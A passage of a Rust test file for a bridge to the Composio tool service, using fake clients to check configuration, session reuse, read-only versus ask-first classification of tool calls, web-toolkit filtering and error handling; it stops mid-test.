//! Port of bridge/tests/test_composio_tools.py (the switch, the owner's session, the ask-first gate, and execute
//! that never fails), test_composio_workbench.py, test_composio_lite_decide.py, and the parts of
//! test_lean_appspolicy_replay.py, test_lean_routedturn_replay.py, test_routine_app_policy.py,
//! test_updates_composio.py, test_tool_gate.py and test_suite_isolation.py that exercise this module.
//!
//! No network: a fake client stands in for Composio. `tests/fixtures/python_verdicts.json` holds composio_tools.py's
//! own answers over the owner golden's corpus and more; the replay test agrees with every one.

use std::collections::{BTreeSet, HashMap};
use std::io::Write;
use std::sync::Arc;

use async_trait::async_trait;
use parking_lot::Mutex;
use serde_json::{json, Map, Value};

use super::*;

// ---- helpers ------------------------------------------------------------------------------------------------

fn env(pairs: &[(&str, &str)]) -> Environ {
    pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect::<HashMap<_, _>>()
}

fn owners(ids: &[i64]) -> BTreeSet<i64> {
    ids.iter().copied().collect()
}

fn obj(v: Value) -> Map<String, Value> {
    v.as_object().cloned().expect("an object")
}

#[derive(Clone, Default)]
struct LogBuf(Arc<Mutex<Vec<u8>>>);

impl Write for LogBuf {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.0.lock().extend_from_slice(buf);
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

impl LogBuf {
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.0.lock()).to_string()
    }
}

/// caplog: every log line on this thread while the guard lives.
fn capture() -> (LogBuf, tracing::subscriber::DefaultGuard) {
    let buf = LogBuf::default();
    let w = buf.clone();
    let sub = tracing_subscriber::fmt()
        .with_writer(move || w.clone())
        .with_ansi(false)
        .with_max_level(tracing::Level::DEBUG)
        .finish();
    (buf, tracing::subscriber::set_default(sub))
}

fn meta_tools() -> Vec<Value> {
    vec![
        json!({"type": "function", "name": "COMPOSIO_SEARCH_TOOLS", "strict": true,
               "parameters": {"type": "object", "properties": {}}}),
        json!({"type": "function", "name": "COMPOSIO_MULTI_EXECUTE_TOOL", "strict": true,
               "parameters": {"type": "object", "properties": {}}}),
        json!({"type": "web_search"}), // not a function tool: filtered out
        json!({"name": "no_type"}),    // no type: filtered out
    ]
}

#[derive(Clone)]
enum Exec {
    Default,
    Answer(Value),
    Fail(ComposioError),
}

struct FakeSession {
    id: String,
    exec: Exec,
    executed: Executed,
    tools: Vec<Value>,
}

#[async_trait]
impl ComposioSession for FakeSession {
    fn session_id(&self) -> String {
        self.id.clone()
    }
    async fn tools(&self) -> Result<Vec<Value>, ComposioError> {
        Ok(self.tools.clone())
    }
    async fn execute(&self, slug: &str, arguments: &Map<String, Value>) -> Result<Value, ComposioError> {
        self.executed.lock().push((slug.to_string(), arguments.clone()));
        match &self.exec {
            Exec::Default => Ok(json!({"data": {"items": [1, 2]}, "error": null, "log_id": "log_123"})),
            Exec::Answer(v) => Ok(v.clone()),
            Exec::Fail(e) => Err(e.clone()),
        }
    }
}

/// (slug, status, alias): an alias of None means the connection has none (named by id).
type Executed = Arc<Mutex<Vec<(String, Map<String, Value>)>>>;

type Conn = (&'static str, &'static str, Option<&'static str>);

#[derive(Default)]
struct Calls {
    created: Vec<String>,
    toolkits: Vec<Value>,
    used: Vec<String>,
    multi: Vec<Option<Value>>,
    n: usize,
    tool_runs: Vec<(String, Map<String, Value>, String, String)>,
}

struct FakeClient {
    calls: Mutex<Calls>,
    connected: Vec<Value>,
    accounts_raise: bool,
    use_raises: bool,
    create_raises: bool,
    exec: Exec,
    tools: Vec<Value>,
    executed: Executed,
}

impl FakeClient {
    fn new() -> Self {
        FakeClient {
            calls: Mutex::new(Calls::default()),
            connected: Vec::new(),
            accounts_raise: false,
            use_raises: false,
            create_raises: false,
            exec: Exec::Default,
            tools: meta_tools(),
            executed: Arc::new(Mutex::new(Vec::new())),
        }
    }

    fn connected(mut self, conns: &[Conn]) -> Self {
        self.connected = conns
            .iter()
            .enumerate()
            .map(|(i, (slug, status, alias))| {
                json!({"toolkit": {"slug": slug}, "status": status, "id": format!("ca_{slug}_{i}"), "alias": alias})
            })
            .collect();
        self
    }

    fn items(mut self, items: Vec<Value>) -> Self {
        self.connected = items;
        self
    }

    fn session(&self, id: String) -> Arc<dyn ComposioSession> {
        Arc::new(FakeSession { id, exec: self.exec.clone(), executed: self.executed.clone(), tools: self.tools.clone() })
    }
}

#[async_trait]
impl ComposioClient for FakeClient {
    async fn create_session(
        &self,
        user_id: &str,
        toolkits: &Value,
        multi_account: Option<&Value>,
    ) -> Result<Arc<dyn ComposioSession>, ComposioError> {
        if self.create_raises {
            return Err(ComposioError::new("ConnectionError", "down"));
        }
        let n = {
            let mut c = self.calls.lock();
            c.created.push(user_id.to_string());
            c.toolkits.push(toolkits.clone());
            c.multi.push(multi_account.cloned());
            c.n += 1;
            c.n
        };
        Ok(self.session(format!("trs_new_{n}")))
    }

    async fn use_session(&self, session_id: &str) -> Result<Arc<dyn ComposioSession>, ComposioError> {
        self.calls.lock().used.push(session_id.to_string());
        if self.use_raises || self.create_raises {
            return Err(ComposioError::new("RuntimeError", "no such session"));
        }
        Ok(self.session(session_id.to_string()))
    }

    async fn list_connected_accounts(&self, _user_ids: &[String]) -> Result<Vec<Value>, ComposioError> {
        if self.accounts_raise {
            return Err(ComposioError::new("RuntimeError", "down"));
        }
        Ok(self.connected.clone())
    }

    async fn execute_tool(
        &self,
        slug: &str,
        arguments: &Map<String, Value>,
        user_id: &str,
        connected_account_id: &str,
    ) -> Result<Value, ComposioError> {
        self.calls.lock().tool_runs.push((
            slug.to_string(),
            arguments.clone(),
            user_id.to_string(),
            connected_account_id.to_string(),
        ));
        Ok(json!({"data": {"ok": true}, "error": null, "successful": true}))
    }
}

fn factory(client: &Arc<FakeClient>) -> Option<ClientFactory> {
    let c = client.clone();
    Some(Arc::new(move || Ok(c.clone() as Arc<dyn ComposioClient>)))
}

fn cfg(dir: &Path, ids: &[i64]) -> ComposioConfig {
    let state = dir.join("composio.json");
    configured(
        Some(&env(&[
            ("EVE_COMPOSIO", "1"),
            ("COMPOSIO_API_KEY", "ak_test"),
            ("EVE_COMPOSIO_STATE", state.to_str().unwrap()),
        ])),
        &owners(ids),
    )
}

fn read_json(path: &Path) -> Value {
    serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap()
}

fn sorted_toolkits() -> Vec<&'static str> {
    let mut t = TOOLKITS.to_vec();
    t.sort();
    t
}

fn d(name: &str, args: &Value) -> Decision {
    decide(name, args, None, true)
}

// ---- test_composio_tools.py ---------------------------------------------------------------------------------

#[test]
fn test_it_ships_off_and_needs_the_switch_and_the_key() {
    let tmp = tempfile::tempdir().unwrap();
    let o = owners(&[42, 7]);
    const { assert!(!COMPOSIO_DEFAULT) };
    assert!(!configured(Some(&env(&[])), &o).enabled);
    assert!(!configured(Some(&env(&[("COMPOSIO_API_KEY", "ak_x")])), &o).enabled); // key without the switch
    let (logs, guard) = capture();
    assert!(!configured(Some(&env(&[("EVE_COMPOSIO", "1")])), &o).enabled); // switch without the key
    assert!(!configured(Some(&env(&[("EVE_COMPOSIO", "yes"), ("COMPOSIO_API_KEY", "ak_x")])), &BTreeSet::new()).enabled);
    drop(guard);
    let text = logs.text();
    assert!(text.contains("COMPOSIO_API_KEY") && text.contains("owner"), "{text}");
    assert!(!text.contains("ak_x"));
    let state = tmp.path().join("s.json");
    let c = configured(
        Some(&env(&[
            ("EVE_COMPOSIO", "on"),
            ("COMPOSIO_API_KEY", "ak_secret_value"),
            ("EVE_COMPOSIO_STATE", state.to_str().unwrap()),
            ("EVE_COMPOSIO_TIMEOUT_SECS", "12.5"),
        ])),
        &o,
    );
    assert!(c.enabled);
    assert_eq!(c.user_id, "telegram-7-42"); // sorted, so the same owners always name the same session
    assert_eq!(c.state_path, state);
    assert_eq!(c.timeout_secs, 12.5);
    assert!(!format!("{c:?}").contains("ak_secret_value"));
    assert!(!configured(Some(&env(&[("EVE_COMPOSIO", "0"), ("COMPOSIO_API_KEY", "ak_x")])), &o).enabled);
    // Defaults hold when the overrides are absent or junk.
    let dflt = configured(Some(&env(&[("EVE_COMPOSIO_TIMEOUT_SECS", "nope")])), &o);
    assert_eq!(dflt.timeout_secs, 60.0);
    assert_eq!(dflt.state_path, eve_apps_mcp::py::expanduser(Path::new("~/.config/eve-bridge/composio.json")));
    // a zero or negative timeout is the default too, and a padded switch still counts
    assert_eq!(configured(Some(&env(&[("EVE_COMPOSIO_TIMEOUT_SECS", "-3")])), &o).timeout_secs, 60.0);
    assert_eq!(configured(Some(&env(&[("EVE_COMPOSIO_TIMEOUT_SECS", " 1_5 ")])), &o).timeout_secs, 15.0);
    assert!(configured(Some(&env(&[("EVE_COMPOSIO", " TRUE "), ("COMPOSIO_API_KEY", "k")])), &o).enabled);
    assert!(!configured(Some(&env(&[("EVE_COMPOSIO", "1"), ("COMPOSIO_API_KEY", "   ")])), &o).enabled);
}

#[tokio::test]
async fn test_the_session_is_the_owners_and_is_reused() {
    let tmp = tempfile::tempdir().unwrap();
    let c = cfg(tmp.path(), &[7]);
    let first = Arc::new(FakeClient::new());
    let b1 = ComposioBridge::new(c.clone(), factory(&first));
    b1.start().await.unwrap();
    assert_eq!(first.calls.lock().created, vec!["telegram-7"]);
    assert!(first.calls.lock().used.is_empty());
    assert_eq!(b1.session_id(), "trs_new_1");
    let state = read_json(&c.state_path);
    assert_eq!(
        state,
        json!({"user_id": "telegram-7", "session_id": "trs_new_1", "toolkits": sorted_toolkits(), "multi_account": false})
    );
    // byte for byte what Python's json.dump(indent=2) wrote
    assert_eq!(
        std::fs::read_to_string(&c.state_path).unwrap(),
        "{\n  \"user_id\": \"telegram-7\",\n  \"session_id\": \"trs_new_1\",\n  \"toolkits\": [\n    \"linear\",\n    \
         \"notion\",\n    \"slack\"\n  ],\n  \"multi_account\": false\n}\n"
    );
    assert_eq!(first.calls.lock().toolkits, vec![json!({"enable": sorted_toolkits()})]); // an allow-list: no web toolkits
    assert!(TOOLKITS.iter().all(|t| !WEB_TOOLKITS.contains(t)));
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(&c.state_path).unwrap().permissions().mode() & 0o777, 0o600);
    }
    // Only function tools with a name survive; names is derived from them.
    assert!(b1.tools().iter().all(|t| t["type"] == "function" && truthy(t.get("name"))));
    assert_eq!(
        b1.names(),
        ["COMPOSIO_SEARCH_TOOLS", "COMPOSIO_MULTI_EXECUTE_TOOL"].iter().map(|s| s.to_string()).collect::<BTreeSet<_>>()
    );

    // Restart: the second bridge resumes the stored id instead of creating.
    let second = Arc::new(FakeClient::new());
    let b2 = ComposioBridge::new(c.clone(), factory(&second));
    b2.start().await.unwrap();
    assert_eq!(second.calls.lock().used, vec!["trs_new_1"]);
    assert!(second.calls.lock().created.is_empty());
    assert_eq!(b2.session_id(), "trs_new_1");

    // A session stored before the allow-list (no "toolkits" in the state) has the web toolkits:
    // it is not resumed, and a fresh one is made with the list (2026-09-30).
    std::fs::write(&c.state_path, json!({"user_id": "telegram-7", "session_id": "trs_old"}).to_string()).unwrap();
    let older = Arc::new(FakeClient::new());
    ComposioBridge::new(c.clone(), factory(&older)).start().await.unwrap();
    assert!(older.calls.lock().used.is_empty());
    assert_eq!(older.calls.lock().created, vec!["telegram-7"]);
    assert_eq!(read_json(&c.state_path)["toolkits"], json!(sorted_toolkits()));

    // A stored id for someone else is not ours: create, and overwrite the state.
    std::fs::write(&c.state_path, json!({"user_id": "telegram-999", "session_id": "trs_theirs"}).to_string()).unwrap();
    let third = Arc::new(FakeClient::new());
    ComposioBridge::new(c.clone(), factory(&third)).start().await.unwrap();
    assert!(third.calls.lock().used.is_empty());
    assert_eq!(third.calls.lock().created, vec!["telegram-7"]);
    assert_eq!(read_json(&c.state_path)["session_id"], "trs_new_1");

    // A stored id the server no longer knows: use fails, create takes over, the state heals.
    let fourth = Arc::new(FakeClient { use_raises: true, ..FakeClient::new() });
    let b4 = ComposioBridge::new(c.clone(), factory(&fourth));
    b4.start().await.unwrap();
    assert_eq!(fourth.calls.lock().used, vec!["trs_new_1"]);
    assert_eq!(fourth.calls.lock().created, vec!["telegram-7"]);
    assert_eq!(b4.session_id(), "trs_new_1");
    assert_eq!(read_json(&c.state_path)["session_id"], "trs_new_1");

    // A state file that is not JSON, or not an object, is no state.
    std::fs::write(&c.state_path, "[1, 2]").unwrap();
    let fifth = Arc::new(FakeClient::new());
    ComposioBridge::new(c.clone(), factory(&fifth)).start().await.unwrap();
    assert!(fifth.calls.lock().used.is_empty());
    std::fs::write(&c.state_path, "{not json").unwrap();
    let sixth = Arc::new(FakeClient::new());
    ComposioBridge::new(c.clone(), factory(&sixth)).start().await.unwrap();
    assert_eq!(sixth.calls.lock().created.len(), 1);
}

#[test]
fn test_read_only_slugs_run_and_consequential_slugs_ask_first() {
    assert!(is_read_only("GMAIL_FETCH_EMAILS") && is_read_only("GITHUB_LIST_REPOSITORY_ISSUES"));
    assert!(is_read_only("googlecalendar_find_event") && is_read_only("NOTION_SEARCH"));
    assert!(is_read_only("GOOGLECALENDAR_EVENTS_LIST_ALL_CALENDARS")); // the verb is not always the first word
    assert!(!is_read_only("GMAIL_SEND_EMAIL") && !is_read_only("GITHUB_CREATE_ISSUE"));
    assert!(!is_read_only("GETTY_UPLOAD")); // a verb-like toolkit name does not make the call read-only
    assert!(!is_read_only("GMAIL_GET_AND_DELETE_MESSAGE")); // a read word beside a write word writes
    assert!(!is_read_only("SLACK_DELETE_MESSAGE") && !is_read_only("") && !is_read_only("GMAIL"));
    // re.match's $ also matches before one final newline
    assert!(is_read_only("GMAIL_FETCH_EMAILS\n") && !is_read_only("GMAIL_FETCH_EMAILS\n\n"));
    assert!(!is_read_only(" GMAIL_FETCH_EMAILS"));
}

fn multi_work(slugs: &[&str]) -> Value {
    // Gmail and the calendar run through Composio only for the owner's other account, named (2026-10-05)
    json!({"tools": slugs.iter().map(|s| json!({"tool_slug": s, "arguments": {}, "account": "work"})).collect::<Vec<_>>()})
}

#[test]
fn test_gmail_is_read_only_and_the_calendar_may_write() {
    assert_eq!(d(MULTI_EXECUTE, &multi_work(&["GMAIL_FETCH_EMAILS", "GOOGLECALENDAR_FIND_EVENT"])).action, Action::Run);
    let x = d(MULTI_EXECUTE, &multi_work(&["GMAIL_SEND_EMAIL"]));
    assert!(x.action == Action::Refuse && x.slugs == ["GMAIL_SEND_EMAIL"] && x.why.contains("gmail is read only here"));
    let x = d(MULTI_EXECUTE, &multi_work(&["GOOGLECALENDAR_CREATE_EVENT", "GOOGLECALENDAR_FIND_EVENT"]));
    assert_eq!(x.action, Action::Run);
    assert_eq!(x.why, "allowed to write: GOOGLECALENDAR_CREATE_EVENT");
    let x = d(MULTI_EXECUTE, &multi_work(&["SLACK_SEND_MESSAGE"]));
    assert_eq!(x, Decision::new(Action::Ask, vec!["SLACK_SEND_MESSAGE".into()], ""));
    // mixed: refuse beats ask beats write
    let x = d(MULTI_EXECUTE, &multi_work(&["GOOGLECALENDAR_CREATE_EVENT", "SLACK_SEND_MESSAGE", "GMAIL_SEND_EMAIL"]));
    assert!(x.action == Action::Refuse && x.slugs == ["GMAIL_SEND_EMAIL"]);
    assert_eq!(d(MULTI_EXECUTE, &multi_work(&["GOOGLECALENDAR_CREATE_EVENT", "SLACK_SEND_MESSAGE"])).action, Action::Ask);
    assert_eq!(d("COMPOSIO_REMOTE_BASH_TOOL", &json!({"command": "ls"})).action, Action::Ask);
    assert_eq!(d("COMPOSIO_SEARCH_TOOLS", &json!({})).action, Action::Run);
    // the owner's env overrides and extends
    let pol = toolkit_policy(Some(&env(&[("EVE_COMPOSIO_POLICY", "gmail=ask, slack=write,notion=bogus,=read")])));
    let want: Policy = [("gmail", "ask"), ("googlecalendar", "auto"), ("googledrive", "auto"), ("slack", "write")]
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    assert_eq!(pol, want);
    assert_eq!(decide(MULTI_EXECUTE, &multi_work(&["GMAIL_SEND_EMAIL"]), Some(&pol), true).action, Action::Ask);
    assert_eq!(toolkit_policy(Some(&env(&[]))), default_toolkit_policy());
    assert_eq!(d(MULTI_EXECUTE, &multi_work(&["GOOGLEDRIVE_LIST_FILES"])).action, Action::Run);
    assert_eq!(d(MULTI_EXECUTE, &multi_work(&["GOOGLEDRIVE_UPLOAD_FILE"])).action, Action::Run);

    let mixed = json!({"tools": [
        {"tool_slug": "GMAIL_FETCH_EMAILS", "arguments": {"max_results": 5}},
        {"tool_slug": "GMAIL_SEND_EMAIL", "arguments": {"to": "x@y.com", "subject": "Hello"}},
        {"tool_slug": "GITHUB_LIST_REPOSITORY_ISSUES", "arguments": {}},
        {"tool_slug": "SLACK_SEND_MESSAGE", "arguments": {"channel": "#general", "text": "hi"}},
    ], "thought": "do it", "sync_response_to_workbench": false, "current_step": "1"});
    assert_eq!(consequential_slugs(MULTI_EXECUTE, &mixed), vec!["GMAIL_SEND_EMAIL", "SLACK_SEND_MESSAGE"]);
    let reads = json!({"tools": [{"tool_slug": "GMAIL_FETCH_EMAILS", "arguments": {}},
                                 {"tool_slug": "GOOGLECALENDAR_FIND_EVENT", "arguments": {}}]});
    assert!(consequential_slugs(MULTI_EXECUTE, &reads).is_empty());
    assert!(consequential_slugs(MULTI_EXECUTE, &json!({})).is_empty());
    assert!(consequential_slugs(MULTI_EXECUTE, &json!({"tools": "junk"})).is_empty());
    assert!(consequential_slugs("COMPOSIO_SEARCH_TOOLS", &json!({"queries": [{"use_case": "send mail"}]})).is_empty());
    assert!(consequential_slugs("COMPOSIO_GET_TOOL_SCHEMAS", &json!({})).is_empty());
    assert!(consequential_slugs("COMPOSIO_MANAGE_CONNECTIONS", &json!({})).is_empty());
    assert_eq!(consequential_slugs("COMPOSIO_REMOTE_BASH_TOOL", &json!({"command": "ls"})), vec!["COMPOSIO_REMOTE_BASH_TOOL"]);
    assert_eq!(consequential_slugs("COMPOSIO_REMOTE_WORKBENCH", &json!({})), vec!["COMPOSIO_REMOTE_WORKBENCH"]);

    let line = describe_for_confirmation(MULTI_EXECUTE, &mixed);
    assert_eq!(
        line,
        "Run GMAIL_SEND_EMAIL with to: x@y.com, subject: Hello; and SLACK_SEND_MESSAGE with channel: #general, text: hi?"
    );
    assert!(!line.contains("GMAIL_FETCH_EMAILS")); // the reads are not what the owner is asked about
    assert_eq!(
        describe_for_confirmation("COMPOSIO_REMOTE_BASH_TOOL", &json!({"command": "ls -la"})),
        "Run COMPOSIO_REMOTE_BASH_TOOL with command: ls -la?"
    );
    assert_eq!(describe_for_confirmation("COMPOSIO_REMOTE_WORKBENCH", &json!({})), "Run COMPOSIO_REMOTE_WORKBENCH?");

    // Clipping: each value to 60 chars, the line to 300; newlines flattened; nested values serialised.
    let long = json!({"tools": [{"tool_slug": "GMAIL_SEND_EMAIL", "arguments": {
        "to": "x@y.com", "body": format!("line one\nline two {}", "z".repeat(500)), "cc": ["a@b.c", "d@e.f"],
        "n": 3, "flag": true}}]});
    let line = describe_for_confirmation(MULTI_EXECUTE, &long);
    assert!(line.starts_with("Run GMAIL_SEND_EMAIL with to: x@y.com, body: line one line two zzz"));
    assert!(line.ends_with('?') && line.chars().count() <= 300 && !line.contains('\n'));
    let body = line.split_once("body: ").unwrap().1.split_once(", cc:").unwrap().0;
    assert!(body.chars().count() <= 60);
    assert!(line.contains("cc: [\"a@b.c\", \"d@e.f\"]") && line.contains("n: 3") && line.contains("flag: true"));
    let many = json!({"tools": (0..12).map(|i| json!({"tool_slug": format!("APP_CREATE_THING_{i}"),
                                                       "arguments": {"v": "w".repeat(60)}})).collect::<Vec<_>>()});
    let line = describe_for_confirmation(MULTI_EXECUTE, &many);
    assert!(line.chars().count() <= 300 && line.ends_with('?'));
    for text in [line, describe_for_confirmation(MULTI_EXECUTE, &mixed)] {
        // no emoji (the only high code point allowed is the ellipsis)
        assert!(!text.chars().any(|ch| ch as u32 > 0x2FFF));
        assert!(!text.contains(" - ") && !text.contains(" — "));
    }
}

#[tokio::test]
async fn test_execute_never_raises() {
    let tmp = tempfile::tempdir().unwrap();
    let c = cfg(tmp.path(), &[7]);
    // Not started: a reason, not an error.
    let idle = ComposioBridge::new(c.clone(), factory(&Arc::new(FakeClient::new())));
    assert_eq!(
        Value::Object(idle.execute("COMPOSIO_SEARCH_TOOLS", &Map::new()).await),
        json!({"ok": false, "reason": "composio is not started"})
    );
    assert!(idle.tools().is_empty() && idle.names().is_empty());

    // A good result is a plain map the model can read, with ok and the log id.
    let client = Arc::new(FakeClient::new());
    let ok = ComposioBridge::new(c.clone(), factory(&client));
    ok.start().await.unwrap();
    let args = obj(json!({"queries": [{"use_case": "mail"}]}));
    let out = ok.execute("COMPOSIO_SEARCH_TOOLS", &args).await;
    assert_eq!(Value::Object(out), json!({"data": {"items": [1, 2]}, "error": null, "log_id": "log_123", "ok": true}));
    assert_eq!(*client.executed.lock(), vec![("COMPOSIO_SEARCH_TOOLS".to_string(), args)]);

    // The server said error: ok is false, the payload is kept for the model to explain.
    let said_no = Arc::new(FakeClient {
        exec: Exec::Answer(json!({"data": {}, "error": "not connected", "log_id": "log_123"})),
        ..FakeClient::new()
    });
    let b = ComposioBridge::new(c.clone(), factory(&said_no));
    b.start().await.unwrap();
    let out = b.execute(MULTI_EXECUTE, &obj(json!({"tools": []}))).await;
    assert!(out["ok"] == false && out["error"] == "not connected" && out["log_id"] == "log_123");

    // The client failed: the type and a short message, and the log names the type but never the arguments.
    let boom = Arc::new(FakeClient {
        exec: Exec::Fail(ComposioError::new("TimeoutError", format!("upstream took {}", "x".repeat(400)))),
        ..FakeClient::new()
    });
    let b = ComposioBridge::new(c.clone(), factory(&boom));
    b.start().await.unwrap();
    let (logs, guard) = capture();
    let out = b
        .execute(
            MULTI_EXECUTE,
            &obj(json!({"tools": [{"tool_slug": "GMAIL_SEND_EMAIL", "arguments": {"body": "SECRET BODY"}}]})),
        )
        .await;
    drop(guard);
    assert_eq!(out["ok"], false);
    let reason = out["reason"].as_str().unwrap();
    assert!(reason.starts_with("TimeoutError: upstream took x"));
    assert!(reason.chars().count() <= "TimeoutError: ".len() + 200);
    let text = logs.text();
    assert!(text.contains("TimeoutError") && !text.contains("SECRET BODY") && !text.contains("GMAIL_SEND_EMAIL"));

    // A result that is not a mapping is still a map, under "data".
    let odd = Arc::new(FakeClient { exec: Exec::Answer(json!([1, "/x"])), ..FakeClient::new() });
    let b = ComposioBridge::new(c.clone(), factory(&odd));
    b.start().await.unwrap();
    assert_eq!(
        Value::Object(b.execute("COMPOSIO_GET_TOOL_SCHEMAS", &Map::new()).await),
        json!({"data": [1, "/x"], "ok": true})
    );
    // An "ok" the server already set is kept.
    let set = Arc::new(FakeClient { exec: Exec::Answer(json!({"ok": "kept", "error": "e"})), ..FakeClient::new() });
    let b = ComposioBridge::new(c.clone(), factory(&set));
    b.start().await.unwrap();
    assert_eq!(b.execute("X", &Map::new()).await["ok"], "kept");
}

#[test]
fn test_label_is_a_write_only_as_the_verb() {
    for (slug, read) in [
        ("GMAIL_GET_LABEL", true), // the unread count lives on the INBOX label: a read (live, 2026-09-23)
        ("GMAIL_LIST_LABELS", true),
        ("GMAIL_FETCH_EMAILS", true),
        ("GMAIL_ADD_LABEL_TO_EMAIL", false),
        ("GMAIL_CREATE_LABEL", false),
        ("GMAIL_MODIFY_THREAD_LABELS", false),
        ("GMAIL_LABEL_EMAIL", false), // LABEL in verb position is still a write
        ("GMAIL_SEND_EMAIL", false),
        ("GMAIL_GET_DRAFT", true), // the same trap for the other noun-verbs
        ("GMAIL_LIST_DRAFTS", true),
        ("GMAIL_CREATE_EMAIL_DRAFT", false),
        ("GMAIL_SEND_DRAFT", false),
        ("GITHUB_GET_A_WORKFLOW_RUN", true),
        ("GITHUB_RUN_WORKFLOW", false),
        ("SHOPIFY_GET_ORDER", true),
        ("AMAZON_ORDER_ITEM", false),
        ("GOOGLECALENDAR_GET_SCHEDULE", true),
        ("GOOGLECALENDAR_SCHEDULE_MEETING", false),
        ("GMAIL_FETCH_AND_DELETE_DRAFT", false), // a real write verb anywhere still blocks
    ] {
        assert_eq!(is_read_only(slug), read, "{slug}");
    }
}

#[test]
fn test_web_toolkit_slugs_catch_web_search_and_scrapers_by_prefix() {
    let web = json!({"tools": [{"tool_slug": "EXA_SEARCH", "arguments": {}}, {"tool_slug": "GMAIL_FETCH_EMAILS", "arguments": {}},
                               {"tool_slug": "BROWSER_TOOL_CREATE_TASK", "arguments": {}},
                               {"tool_slug": "SCRAPEGRAPH_AI_SMART_SCRAPE", "arguments": {}}]});
    assert_eq!(
        web_toolkit_slugs(MULTI_EXECUTE, &web),
        vec!["EXA_SEARCH", "BROWSER_TOOL_CREATE_TASK", "SCRAPEGRAPH_AI_SMART_SCRAPE"]
    );
    // the owner's own apps are never caught, nor a toolkit that only starts with the same letters
    let apps = json!({"tools": [{"tool_slug": "GOOGLECALENDAR_CREATE_EVENT", "arguments": {}},
                                {"tool_slug": "EXAMPLEAPP_GET_THING", "arguments": {}}]});
    assert!(web_toolkit_slugs(MULTI_EXECUTE, &apps).is_empty());
    assert!(web_toolkit_slugs("COMPOSIO_SEARCH_TOOLS", &web).is_empty());
}

#[tokio::test]
async fn test_the_allow_list_adds_what_is_connected_and_never_a_web_toolkit() {
    let tmp = tempfile::tempdir().unwrap();
    let c = cfg(tmp.path(), &[7]);
    let client = Arc::new(FakeClient::new().connected(&[
        ("canvas", "ACTIVE", None),
        ("gmail", "EXPIRED", None),
        ("exa", "ACTIVE", None),
        ("figma", "INITIATED", None),
    ]));
    ComposioBridge::new(c.clone(), factory(&client)).start().await.unwrap();
    let enabled = client.calls.lock().toolkits[0]["enable"].clone();
    let names: Vec<&str> = enabled.as_array().unwrap().iter().map(|v| v.as_str().unwrap()).collect();
    assert!(names.contains(&"canvas")); // an app connected outside the list still works
    assert!(!names.contains(&"exa") && !names.contains(&"figma")); // a web toolkit never; a half-made connection not
    let mut want: Vec<&str> = TOOLKITS.to_vec();
    want.push("canvas");
    want.sort();
    assert_eq!(names, want);
    // connecting an app changes the list: the stored session is not resumed, a fresh one is made
    let later = Arc::new(FakeClient::new().connected(&[("canvas", "ACTIVE", None), ("figma", "ACTIVE", None)]));
    ComposioBridge::new(c.clone(), factory(&later)).start().await.unwrap();
    assert!(later.calls.lock().used.is_empty());
    assert!(later.calls.lock().toolkits[0]["enable"].as_array().unwrap().contains(&json!("figma")));
    // the same list again: resumed
    let again = Arc::new(FakeClient::new().connected(&[("canvas", "ACTIVE", None), ("figma", "ACTIVE", None)]));
    ComposioBridge::new(c.clone(), factory(&again)).start().await.unwrap();
    assert!(again.calls.lock().created.is_empty());
    assert_eq!(again.calls.lock().used.len(), 1);
}

#[tokio::test]
async fn test_the_setting_replaces_the_list_all_lifts_it_and_a_failed_lookup_keeps_it() {
    let tmp = tempfile::tempdir().unwrap();
    let state = tmp.path().join("c.json");
    let base = [("EVE_COMPOSIO", "1"), ("COMPOSIO_API_KEY", "ak_test"), ("EVE_COMPOSIO_STATE", state.to_str().unwrap())];
    let with = |extra: (&str, &str)| {
        let mut e = env(&base);
        e.insert(extra.0.to_string(), extra.1.to_string());
        e
    };
    assert_eq!(
        configured(Some(&with(("EVE_COMPOSIO_TOOLKITS", " Gmail, notion ,gmail"))), &owners(&[7])).toolkits,
        Some(vec!["gmail".to_string(), "notion".to_string()])
    );
    let unlimited = configured(Some(&with(("EVE_COMPOSIO_TOOLKITS", "all"))), &owners(&[7]));
    assert_eq!(unlimited.toolkits, None);
    let client = Arc::new(FakeClient::new());
    ComposioBridge::new(unlimited, factory(&client)).start().await.unwrap();
    // no allow-list, but the direct apps and a Gmail/Calendar with no other account stay out (Lean AppsPolicy P3)
    assert_eq!(client.calls.lock().toolkits, vec![json!({"disable": ["github", "gmail", "googlecalendar", "googledrive"]})]);
    // the state file records the {"disable": …} form
    assert_eq!(read_json(&state)["toolkits"], json!({"disable": ["github", "gmail", "googlecalendar", "googledrive"]}));
    let down = Arc::new(FakeClient { accounts_raise: true, ..FakeClient::new() });
    ComposioBridge::new(configured(Some(&env(&base)), &owners(&[7])), factory(&down)).start().await.unwrap();
    assert_eq!(down.calls.lock().toolkits, vec![json!({"enable": sorted_toolkits()})]);
}

#[tokio::test]
async fn test_two_accounts_on_one_app_make_a_multi_account_session_that_must_name_the_account() {
    let tmp = tempfile::tempdir().unwrap();
    let c = cfg(tmp.path(), &[7]);
    let one = Arc::new(FakeClient::new().connected(&[("slack", "ACTIVE", Some("personal")), ("notion", "ACTIVE", None)]));
    let bridge = ComposioBridge::new(c.clone(), factory(&one));
    bridge.start().await.unwrap();
    assert_eq!(one.calls.lock().multi, vec![None]); // one account per app: the session is unchanged
    assert!(!bridge.multi_account() && bridge.accounts_note().is_empty());

    let conns: [Conn; 4] = [
        ("slack", "ACTIVE", Some("personal")),
        ("slack", "ACTIVE", Some("work")),
        ("slack", "EXPIRED", None),
        ("notion", "ACTIVE", None),
    ];
    let two = Arc::new(FakeClient::new().connected(&conns));
    let bridge = ComposioBridge::new(c.clone(), factory(&two));
    bridge.start().await.unwrap();
    // the stored one-account session is not resumed: multi-account mode is fixed when a session is made
    assert!(two.calls.lock().used.is_empty());
    assert_eq!(two.calls.lock().created, vec!["telegram-7"]);
    assert_eq!(two.calls.lock().multi, vec![Some(json!({"enable": true, "require_explicit_selection": true}))]);
    let note = bridge.accounts_note();
    assert!(note.contains("slack: personal, work") && !note.contains("notion")); // an expired one is not offered
    assert!(note.contains(&format!("\"{PRIMARY_ALIAS}\""))); // writes go to the owner's own account
    assert_eq!(read_json(&c.state_path)["multi_account"], true);

    let again = Arc::new(FakeClient::new().connected(&conns));
